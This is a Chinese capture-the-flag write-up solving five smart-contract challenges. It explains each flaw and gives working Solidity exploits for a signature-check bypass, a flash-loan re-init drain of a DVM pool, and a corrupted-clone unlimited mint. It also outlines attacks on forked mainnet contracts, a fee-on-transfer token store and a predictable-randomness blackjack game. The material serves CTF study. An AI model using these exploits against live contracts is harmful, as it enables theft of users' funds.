- [BlackSheep](#blacksheep)
- [dodont](#dodont)
- [Dai++](#dai)
- [GrainsOfSand](#grainsofsand)
- [SkilledBasedGame](#skilledbasedgame)


## BlackSheep

**Goal**

```rust
Bank.balance == 0;
```

**Solution**

目的是从`Bank`中取出所有的存款。

我不是很了解`Huff`，所以基本在通过`AI`解题。

开头定义了`withdraw`接口:

```solidity
function withdraw(bytes32,uint8,bytes32,bytes32) payable returns ()
```

代码中定义了`withdraw`会调用`CHECKVALUE`和`CHECKSIG`。

我们的目的是为了调用

```solidity
selfbalance caller
gas call
end jump
```
前提条件
```solidity
 iszero iszero noauth jumpi
```
就是`CHECKSIG`返回`0`，也就是签名和`xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044` 相等，很显然这是不可能的，所以我们就要想想办法。

后面我看到`CHECKSIG`其实根本没有把值推到栈上，而是end返回了:

```solidity
    0xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044 eq correctSigner jumpi
```

如果匹配错误，`0 jumpi` 其实根本不会执行，而是直接执行下一行`end jump` 这说明什么？

我们不需要思考如何绕过验证`signer`，我们只需要让`CHECKVALUE`() `revert`就好了，这样栈顶的值就会是`0`，从而成功绕过，那么让`CHECKVALUE() revert`其实很简单，我们只需要定义一个合约在他的`fallback`函数中`revert` 即可。

**Exp**

```solidity
contract Exploit {
    function exp(ISimpleBank bank) external payable {
        bank.withdraw{value: 10}(
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x00,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
    }

    fallback() external payable {
        require(msg.value > 30);
    }
}
```

## dodont

**Goal**

```solidity
function isSolved() external view returns (bool) {
        return WETH.balanceOf(dvm) == 0;
    }
```

**Solution**

题目中给了`DVM`的地址`0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445` ，对`DVM.sol`进行简单的浏览，发现`init`函数没有任何的权限校验，同时有`flashloan`，所以就是通过`flashloan`，在回调函数的时候修改`baseTokenAddress`和`quoteTokenAddress`，从而绕过了检测，并且把所有的`WETH`提取出来。

```solidity
function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external {
        require(baseTokenAddress != quoteTokenAddress, "BASE_QUOTE_CAN_NOT_BE_SAME");
        _BASE_TOKEN_ = IERC20(baseTokenAddress);
        _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);

        require(i > 0 && i <= 10**36);
        _I_ = i;

        require(k <= 10**18);
        _K_ = k;

        _LP_FEE_RATE_ = lpFeeRate;
        _MT_FEE_RATE_MODEL_ = IFeeRateModel(mtFeeRateModel);
        _MAINTAINER_ = maintainer;

        _IS_OPEN_TWAP_ = isOpenTWAP;
        if(isOpenTWAP) _BLOCK_TIMESTAMP_LAST_ = uint32(block.timestamp % 2**32);

        string memory connect = "_";
        string memory suffix = "DLP";

        name = string(abi.encodePacked(suffix, connect, addressToShortString(address(this))));
        symbol = "DLP";
        decimals = _BASE_TOKEN_.decimals();

        // ============================== Permit ====================================
        uint256 chainId;
        assembly {
            chainId := chainid()
        }
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),
                0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,
                keccak256(bytes(name)),
                keccak256(bytes("1")),
                chainId,
                address(this)
            )
        );
        // ==========================================================================
    }
```

**Exp**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/dodont/Challenge.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface CloneFactoryLike {
    function clone(address) external returns (address);
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function buyShares(address) external;
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
    function _QUOTE_TOKEN_() external view returns (address);
}

contract QuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract DoDontTest is Test {
    CloneFactoryLike private immutable CLONE_FACTORY = CloneFactoryLike(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
    address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;

    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    QuoteToken quoteToken;
    DVMLike dvm;
    Challenge public challenge;

    function setUp() public {
        payable(address(WETH)).call{value: 100 ether}(hex"");

        quoteToken = new QuoteToken();

        dvm = DVMLike(CLONE_FACTORY.clone(DVM_TEMPLATE));
        dvm.init(
            address(this),
            address(WETH),
            address(quoteToken),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );

        WETH.transfer(address(dvm), WETH.balanceOf(address(this)));
        quoteToken.transfer(address(dvm), quoteToken.balanceOf(address(this)) / 2);
        dvm.buyShares(address(this));

        challenge = new Challenge(address(dvm));
    }

    function test_exploitdodont() public {
        dvm.flashLoan(WETH.balanceOf(address(dvm)), quoteToken.balanceOf(address(dvm)), address(this), hex"11");
        if (challenge.isSolved()) {
            console.log("solved");
        } else {
            console.log("not solved");
        }
    }

    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        QuoteToken t1 = new QuoteToken();
        QuoteToken t2 = new QuoteToken();
        t1.transfer(address(dvm), 1_000_000 ether);
        t2.transfer(address(dvm), 1_000_000 ether);

        dvm.init(
            address(this),
            address(t1),
            address(t2),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );
    }
}

```

## Dai++

**Goal**

```solidity
function isSolved() external view returns (bool) {
        return IERC20(SYSTEM_CONFIGURATION.getStablecoin()).totalSupply() > 1_000_000_000_000 ether;
    }
```

**Code**

- `SystemConfiguration`：存储系统配置和授权信息
- `AccountManager`：管理账户的创建和稳定币的铸造/销毁
- `Account`：个人账户合约，处理存款，提款和债务
- `Stablecoin`： 稳定币

**Solution**

问题处在`AccountManager`合约中使用`ClonesWithImmutableArgs`创建新用户时候，在`ClonesWithImmutableArgs`的注释中我们可以看到:

```solidity
 /// @notice Creates a clone proxy of the implementation contract, with immutable args
 /// @dev data cannot exceed 65535 bytes, since 2 bytes are used to store the data length
```

用来`Clone`的`data`大小不能超过`65535`字节，当超过的时候，可能会部署一个损坏的合约。

正常的话如果我们要`mint`超过`1_000_000_000_000` `ether`的`stablecoin`，只有被`System` `Configuration`授权的合约才可以`mint`，只有`AccountManager`合约被授权了，而在`AccountManager::mintStablecoins`，会验证是否是`onlyValidAccount`，只有是`ValidAccount`才可以`mint`，同时还会检查账户的债户危机:

```solidity
function isHealthy(uint256 collateralDecrease, uint256 debtIncrease) public view returns (bool) {
        SystemConfiguration configuration = SystemConfiguration(_getArgAddress(0));

        uint256 totalBalance = address(this).balance - collateralDecrease;
        uint256 totalDebt = debt + debtIncrease;

        (, int256 ethPriceInt,,,) = AggregatorV3Interface(configuration.getEthUsdPriceFeed()).latestRoundData();
        if (ethPriceInt <= 0) return false;

        uint256 ethPrice = uint256(ethPriceInt);

        return totalBalance * ethPrice / 1e8 >= totalDebt * configuration.getCollateralRatio() / 10000;
    }
```

所以正常情况下，我们没有那么多的ETH，根本不可能mint那么多的stablecoin。

当我们利用了上面提到的漏洞，我们创造一个受损的合约，因为这种情况下虽然合约的地址会被创建，但是合约字节码被截断了或者损坏，当合约字节码被损坏时，所有的函数调用实际上都会回退到合约的 fallback 函数（如果存在的话）或者直接失败。这就导致了 increaseDebt 函数变成了一个"幻影函数"。从外部看，这个函数似乎存在，但实际上调用它不会执行任何代码。

从而大量的mint stablecoin。

**Exp**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/dai-plus-plus/Challenge.sol";
import "../src/dai-plus-plus/AccountManager.sol";
import "../src/dai-plus-plus/Stablecoin.sol";
import "../src/dai-plus-plus/SystemConfiguration.sol";
import {Account as Acct} from "../src/dai-plus-plus/Account.sol";

contract DaiPlusPlusTest is Test {
    Challenge challenge;
    SystemConfiguration configuration;
    AccountManager manager;

    function setUp() public {
        configuration = new SystemConfiguration();
        manager = new AccountManager(configuration);

        configuration.updateAccountManager(address(manager));
        configuration.updateStablecoin(address(new Stablecoin(configuration)));
        configuration.updateAccountImplementation(address(new Acct()));
        configuration.updateEthUsdPriceFeed(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

        configuration.updateSystemContract(address(manager), true);
        challenge = new Challenge(configuration);
    }

    function test_daiplusplus() public {
        // 创建一个超长的recoveryAddresses数组
        address[] memory recoveryAddresses = new address[](2044);

        // 打开一个新账户
        Acct account = manager.openAccount(address(this), recoveryAddresses);

        // 铸造大量稳定币
        uint256 targetSupply = 1_000_000_000_000 ether;
        while (IERC20(configuration.getStablecoin()).totalSupply() < targetSupply) {
            manager.mintStablecoins(account, 1_000_000_000_0000 ether, "exploit");
        }
        isSolved();
    }

    function isSolved() public view {
        if (challenge.isSolved()) {
            console.log("Challenge is solved");
        } else {
            console.log("Challenge is not solved");
        }
    }
}

```

## GrainsOfSand

**Goal**

```solidity
function isSolved() external view returns (bool) {
        return INITIAL_BALANCE - TOKEN.balanceOf(TOKENSTORE) >= 11111e8;
    }
```

**Code**

题目中给了Tokenstore的地址和Token的地址：

```solidity
IERC20 private immutable TOKEN = IERC20(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);

address private immutable TOKENSTORE = 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8;
```

在经过了查看后token是叫xgr的代币https://etherscan.io/address/0xC937f5027D47250Fa2Df8CbF21F6F88E98817845#code

TokenStore是一个一直运行的Dex

题目的fork

```solidity
class Challenge(PwnChallengeLauncher):
    def get_anvil_instances(self) -> Dict[str, LaunchAnvilInstanceArgs]:
        return {
            "main": self.get_anvil_instance(fork_block_num=18_437_825),
        }
```

**TokenStore分析**

通过对商店代码的分析，发现了一件事情，Store不支持transfer fee, 但是xgr是有transfer fee的！

```solidity
     function depositToken(address _token, uint256 _amount) deprecable {
         if (!Token(_token).transferFrom(msg.sender, this, _amount)) {
             revert();
         }
         tokens[_token][msg.sender] = safeAdd(tokens[_token][msg.sender], _amount);
     }
    function withdrawToken(address _token, uint256 _amount) {
   tokens[_token][msg.sender] = safeSub(tokens[_token][msg.sender], _amount);
   if (!Token(_token).transfer(msg.sender, _amount)) {
       revert();
   }
}
```

合约假设收到的和发送的代币数量是一致的，同时Store的交易时在链下签名然后提交的:

```solidity
// Note: Order creation happens off-chain but the orders are signed by creators,
// we validate the contents and the creator address in the logic below
function trade(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint256 _amount
    ) {...}
```

**XGR**

代币使用了很糟糕的收取transfer fee的方式

```solidity
function _transfer(address from, address to, uint256 amount, bool fee, bytes extraData) internal {
    // [ ... ]
    uint256 balance = TokenDB(databaseAddress).balanceOf(from);
    uint256 lockedBalance = TokenDB(databaseAddress).lockedBalances(from);
    balance = safeSub(balance, lockedBalance);
    require( _amount > 0 && balance > 0 );
    require( from != 0x00 && to != 0x00 );
    if( fee ) {
        (_success, _fee) = getTransactionFee(amount);
        require( _success );
        if ( balance == amount ) {
            _amount = safeSub(amount, _fee);
        }
    }
    require( balance >= safeAdd(_amount, _fee) );
    if ( fee ) {
        Burn(from, _fee);
    }
    Transfer(from, to, _amount);
    Transfer2(from, to, _amount, extraData);
    require( TokenDB(databaseAddress).transfer(from, to, _amount, _fee) );
}
...
function getTransactionFee(uint256 value) public constant returns (bool success, uint256 fee) {
    fee = safeMul(value, transactionFeeRate) / transactionFeeRateM / 100;
    if ( fee > transactionFeeMax ) { fee = transactionFeeMax; }
    else if ( fee < transactionFeeMin ) { fee = transactionFeeMin; }
    return (true, fee);
}
```

从`getTransactionFee()`来看，手续费大概是:

```solidity
fee = (value * 20) / 1000 / 100

MaxFee = 2e8
MinFee = 0.02e8
```

**Solution**

我们的目标是排空最少11111e8个xgr，那么如果我们每一次都能耗尽MaxFee的话，我们需要:

```solidity
11111e8 / 2e8 = 5,555.5
```

那么触发2e8的最大fee，我们需要的xgr得是:

```solidity
2e8 = (value * 20) / 1000 / 100
value = 10,000e8
```

所以我们总共需要的xgr就是

```solidity
10000e8 * 5556 = 55560000e8
```

这不现实对吧，虽然我们有1000ETH的起始资金，但是这也不现实，自然想到了既然这个TokenStore还在运行，那我们可不可以旅行上面又的卖单，然后看看能旅行多少，然后在再把剩余的Xgr耗尽，这样我们的工作量就少了很多了，通过[Dune](https://dune.com/queries/3239317)来查看

找到了两笔交易，如果我们都能够履行的话 ，那我们我们一下子就完成了

```solidity
11111e8 - 9000e8 - 1900e8 = 211e8
```

我们只需要再耗尽211个就行了，这就很快了

## SkilledBasedGame

**Goal**

```solidity
function isSolved() external view returns (bool) {
        return BLACKJACK.balance == 0;
    }
```

**Code**

题目中给了BlackJack的地址`0xA65D59708838581520511d98fB8b5d1F76A96cad`

```solidity
/**
 *Submitted for verification at Etherscan.io on 2017-02-25
*/

pragma solidity ^0.4.2;

library Deck {
	// returns random number from 0 to 51
	// let's say 'value' % 4 means suit (0 - Hearts, 1 - Spades, 2 - Diamonds, 3 - Clubs)
	//			 'value' / 4 means: 0 - King, 1 - Ace, 2 - 10 - pip values, 11 - Jacket, 12 - Queen

	function deal(address player, uint8 cardNumber) internal returns (uint8) {
		uint b = block.number;
		uint timestamp = block.timestamp;
		return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);
	}

	function valueOf(uint8 card, bool isBigAce) internal constant returns (uint8) {
		uint8 value = card / 4;
		if (value == 0 || value == 11 || value == 12) { // Face cards
			return 10;
		}
		if (value == 1 && isBigAce) { // Ace is worth 11
			return 11;
		}
		return value;
	}

	function isAce(uint8 card) internal constant returns (bool) {
		return card / 4 == 1;
	}

	function isTen(uint8 card) internal constant returns (bool) {
		return card / 4 == 10;
	}
}

contract BlackJack {
	using Deck for *;

	uint public minBet = 50 finney; // 0.05 eth
	uint public maxBet = 5 ether;

	uint8 BLACKJACK = 21;

  enum GameState { Ongoing, Player, Tie, House }

	struct Game {
		address player; // address игрока
		uint bet; // стывка

		uint8[] houseCards; // карты диллера
		uint8[] playerCards; // карты игрока

		GameState state; // состояние
		uint8 cardsDealt;
	}

	mapping (address => Game) public games;

	modifier gameIsGoingOn() {
		if (games[msg.sender].player == 0 || games[msg.sender].state != GameState.Ongoing) {
			throw; // game doesn't exist or already finished
		}
		_;
	}

	event Deal(
        bool isUser,
        uint8 _card
    );

    event GameStatus(
    	uint8 houseScore,
    	uint8 houseScoreBig,
    	uint8 playerScore,
    	uint8 playerScoreBig
    );

    event Log(
    	uint8 value
    );

	function BlackJack() {

	}

	function () payable {
		
	}

	// starts a new game
	function deal() public payable {
		if (games[msg.sender].player != 0 && games[msg.sender].state == GameState.Ongoing) {
			throw; // game is already going on
		}

		if (msg.value < minBet || msg.value > maxBet) {
			throw; // incorrect bet
		}

		uint8[] memory houseCards = new uint8[](1);
		uint8[] memory playerCards = new uint8[](2);

		// deal the cards
		playerCards[0] = Deck.deal(msg.sender, 0);
		Deal(true, playerCards[0]);
		houseCards[0] = Deck.deal(msg.sender, 1);
		Deal(false, houseCards[0]);
		playerCards[1] = Deck.deal(msg.sender, 2);
		Deal(true, playerCards[1]);

		games[msg.sender] = Game({
			player: msg.sender,
			bet: msg.value,
			houseCards: houseCards,
			playerCards: playerCards,
			state: GameState.Ongoing,
			cardsDealt: 3
		});

		checkGameResult(games[msg.sender], false);
	}

	// deals one more card to the player
	function hit() public gameIsGoingOn {
		uint8 nextCard = games[msg.sender].cardsDealt;
		games[msg.sender].playerCards.push(Deck.deal(msg.sender, nextCard));
		games[msg.sender].cardsDealt = nextCard + 1;
		Deal(true, games[msg.sender].playerCards[games[msg.sender].playerCards.length - 1]);
		checkGameResult(games[msg.sender], false);
	}

	// finishes the game
	function stand() public gameIsGoingOn {

		var (houseScore, houseScoreBig) = calculateScore(games[msg.sender].houseCards);

		while (houseScoreBig < 17) {
			uint8 nextCard = games[msg.sender].cardsDealt;
			uint8 newCard = Deck.deal(msg.sender, nextCard);
			games[msg.sender].houseCards.push(newCard);
			games[msg.sender].cardsDealt = nextCard + 1;
			houseScoreBig += Deck.valueOf(newCard, true);
			Deal(false, newCard);
		}

		checkGameResult(games[msg.sender], true);
	}

	// @param finishGame - whether to finish the game or not (in case of Blackjack the game finishes anyway)
	function checkGameResult(Game game, bool finishGame) private {
		// calculate house score
		var (houseScore, houseScoreBig) = calculateScore(game.houseCards);
		// calculate player score
		var (playerScore, playerScoreBig) = calculateScore(game.playerCards);

		GameStatus(houseScore, houseScoreBig, playerScore, playerScoreBig);

		if (houseScoreBig == BLACKJACK || houseScore == BLACKJACK) {
			if (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {
				// TIE
				if (!msg.sender.send(game.bet)) throw; // return bet to the player
				games[msg.sender].state = GameState.Tie; // finish the game
				return;
			} else {
				// HOUSE WON
				games[msg.sender].state = GameState.House; // simply finish the game
				return;
			}
		} else {
			if (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {
				// PLAYER WON
				if (game.playerCards.length == 2 && (Deck.isTen(game.playerCards[0]) || Deck.isTen(game.playerCards[1]))) {
					// Natural blackjack => return x2.5
					if (!msg.sender.send((game.bet * 5) / 2)) throw; // send prize to the player
				} else {
					// Usual blackjack => return x2
					if (!msg.sender.send(game.bet * 2)) throw; // send prize to the player
				}
				games[msg.sender].state = GameState.Player; // finish the game
				return;
			} else {

				if (playerScore > BLACKJACK) {
					// BUST, HOUSE WON
					Log(1);
					games[msg.sender].state = GameState.House; // finish the game
					return;
				}

				if (!finishGame) {
					return; // continue the game
				}
				
                // недобор
				uint8 playerShortage = 0; 
				uint8 houseShortage = 0;

				// player decided to finish the game
				if (playerScoreBig > BLACKJACK) {
					if (playerScore > BLACKJACK) {
						// HOUSE WON
						games[msg.sender].state = GameState.House; // simply finish the game
						return;
					} else {
						playerShortage = BLACKJACK - playerScore;
					}
				} else {
					playerShortage = BLACKJACK - playerScoreBig;
				}

				if (houseScoreBig > BLACKJACK) {
					if (houseScore > BLACKJACK) {
						// PLAYER WON
						if (!msg.sender.send(game.bet * 2)) throw; // send prize to the player
						games[msg.sender].state = GameState.Player;
						return;
					} else {
						houseShortage = BLACKJACK - houseScore;
					}
				} else {
					houseShortage = BLACKJACK - houseScoreBig;
				}
				
                // ?????????????????????? почему игра заканчивается?
				if (houseShortage == playerShortage) {
					// TIE
					if (!msg.sender.send(game.bet)) throw; // return bet to the player
					games[msg.sender].state = GameState.Tie;
				} else if (houseShortage > playerShortage) {
					// PLAYER WON
					if (!msg.sender.send(game.bet * 2)) throw; // send prize to the player
					games[msg.sender].state = GameState.Player;
				} else {
					games[msg.sender].state = GameState.House;
				}
			}
		}
	}

	function calculateScore(uint8[] cards) private constant returns (uint8, uint8) {
		uint8 score = 0;
		uint8 scoreBig = 0; // in case of Ace there could be 2 different scores
		bool bigAceUsed = false;
		for (uint i = 0; i < cards.length; ++i) {
			uint8 card = cards[i];
			if (Deck.isAce(card) && !bigAceUsed) { // doesn't make sense to use the second Ace as 11, because it leads to the losing
				scoreBig += Deck.valueOf(card, true);
				bigAceUsed = true;
			} else {
				scoreBig += Deck.valueOf(card, false);
			}
			score += Deck.valueOf(card, false);
		}
		return (score, scoreBig);
	}

	function getPlayerCard(uint8 id) public gameIsGoingOn constant returns(uint8) {
		if (id < 0 || id > games[msg.sender].playerCards.length) {
			throw;
		}
		return games[msg.sender].playerCards[id];
	}

	function getHouseCard(uint8 id) public gameIsGoingOn constant returns(uint8) {
		if (id < 0 || id > games[msg.sender].houseCards.length) {
			throw;
		}
		return games[msg.sender].houseCards[id];
	}

	function getPlayerCardsNumber() public gameIsGoingOn constant returns(uint) {
		return games[msg.sender].playerCards.length;
	}

	function getHouseCardsNumber() public gameIsGoingOn constant returns(uint) {
		return games[msg.sender].houseCards.length;
	}

	function getGameState() public constant returns (uint8) {
		if (games[msg.sender].player == 0) {
			throw; // game doesn't exist
		}

		Game game = games[msg.sender];

		if (game.state == GameState.Player) {
			return 1;
		}
		if (game.state == GameState.House) {
			return 2;
		}
		if (game.state == GameState.Tie) {
			return 3;
		}

		return 0; // the game is still going on
	}

}
```

大致就是一个，21点的游戏，漏洞其实一眼就可以看出来，是和伪随机数相关，因为BlackJack中使用了BlockNumber

```solidity
	function deal(address player, uint8 cardNumber) internal returns (uint8) {
		uint b = block.number;
		uint timestamp = block.timestamp;
		return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);
	}
```

那我们的关键就是如何去预测呢

我们的获胜方式有两个:

- 获得 21 点（Blackjack）
- 最终点数比庄家高，但不超过 21 点
- 庄家爆牌（超过 21 点）

获胜后，玩家可以得到双倍赌注。如果是自然 Blackjack（前两张牌就是 21 点），玩家可以得到 2.5 倍赌注。

所以我们的攻击步骤就是：

1. 预测初始发牌
2. 根据预测结果决定是否下注（只在有利情况下下注）
3. 如果决定下注，继续预测后续的牌，并据此决定是否要牌（hit）或停牌（stand）
4. 重复这个过程，每次都在最有利的情况下下注